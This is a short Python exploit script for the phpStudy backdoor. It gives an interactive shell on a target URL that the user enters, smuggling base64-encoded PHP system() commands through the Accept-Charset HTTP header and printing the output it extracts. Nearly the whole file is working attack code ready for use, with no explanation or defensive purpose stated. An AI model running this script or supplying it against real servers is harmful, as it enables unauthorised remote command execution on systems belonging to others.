#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import base64

def phpstudy_shell(url):
    try:
        while 1:
            shell = input(">>>P1 regex match：")
            shell_re = "echo \"<lem>\";system(\""+shell+"\");echo \"<lem>\";"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
                'Accept-Encoding': 'gzip,deflate',
                'Accept-Charset': base64.b64encode(shell_re.encode()).decode()
            }
            response = requests.get(url=url,headers=headers,timeout=3)
            response.encoding = 'gb2312'
            #print(response.text)
            text = re.findall(r"<lem>(.+?)<lem>",response.text,re.S)
            print(text[0])
            if shell == "0":
                return
    except:
        print("error phpstudy_shell 1,自动尝试直接执行[{}]命令获取源数据！".format(shell))
        shell_except(url,shell)
        #shell_except(url)

def shell_except(url,shell):
    try:
        while 1:     
            #shell = input(">>>P2 source data：")
            shell_ex = "system(\""+shell+"\");"
            headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': base64.b64encode(shell_ex.encode()).decode()
            }
            response = requests.get(url=url,headers=headers,timeout=3)
            response.encoding = 'gb2312'
            print(response.text)
            phpstudy_shell(url)
            if shell == "0":
                return
    except:
        print("error shell_except 2")

if __name__ == '__main__':
    url =input("input testurl:")
    phpstudy_shell(url)